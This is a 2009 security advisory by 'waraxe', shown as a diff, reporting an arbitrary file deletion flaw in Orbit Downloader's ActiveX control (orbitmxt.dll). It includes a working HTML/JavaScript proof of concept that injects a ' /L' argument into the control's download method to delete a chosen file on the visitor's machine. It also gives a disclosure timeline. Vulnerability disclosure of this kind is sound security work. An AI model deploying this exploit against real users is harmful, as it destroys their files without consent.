@@ -1,0 +1,92 @@
+[waraxe-2009-SA#073] - Arbitrary File Deletion in Orbit Downloader <= 2.8.7
+===============================================================================
+
+Author: Janek Vind "waraxe"
+Date: 21. March 2009
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-73.html
+
+
+Description of vulnerable software:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Orbit Downloader, leader of download manager revolution, is devoted to new
+generation web (web2.0) downloading, such as video/music/streaming media from
+Myspace, YouTube, Imeem, Pandora, Rapidshare, support RTMP. And to make general
+downloading easier and faster.
+
+http://www.orbitdownloader.com/
+
+
+List of found vulnerabilities
+===============================================================================
+
+1. Arbitrary File Deletion
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+CLSID: {3F1D494B-0CEF-4468-96C9-386E2E4DEC90}
+ProgID: Orbitmxt.Orbit
+Executable: orbitmxt.dll
+File Version: 2.1.0.2
+
+Tested on following platforms:
+
+1. Windows XP Pro SP3/IE 6 SP1
+2. Windows Vista Ultimate 64-bit SP1/IE 7
+
+In both cases IE security settings were default for Internet Zone.
+Exploitation tests ended successfully without any warnings or other interaction
+from Internet Explorer.
+
+Proof Of Concept:
+
+<html><head>
+<title>Orbit Downloader &lt;= 2.8.7 Arbitrary File Deletion PoC by waraxe</title>
+<script>
+function test()
+{
+	waraxe.download('','','" /Lc:\\test.txt "','',1);
+}
+</script>
+</head><body>
+<object
+id="waraxe" name="waraxe"
+classid="CLSID:3F1D494B-0CEF-4468-96C9-386E2E4DEC90"
+width="50" height="50">
+</object>
+<br><center>
+<button onclick="javascript:test();">  Test  </button>
+</body></html>
+
+For testing first create "test.txt" file to the C: root dir and
+then use IE and hit test button. "test.txt" should be deleted for now  :) 
+
+
+Disclosure Timeline:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+03/04/09 Developer contacted
+03/04/09 Developer's initial response
+03/04/09 Findings sent to developer
+03/18/09 New version 2.8.7 released, no fix for specific issue!
+03/21/09 Public disclosure
+
+
+Greetings:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Greets to ToXiC, y3dips, Sm0ke, Heintz, slimjim100, pexli, mge, str0ke,
+to all active waraxe.us forum members and to anyone else who know me!
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Waraxe forum:  http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+---------------------------------- [ EOF ] ------------------------------------
+
+# milw0rm.com [2009-03-23]
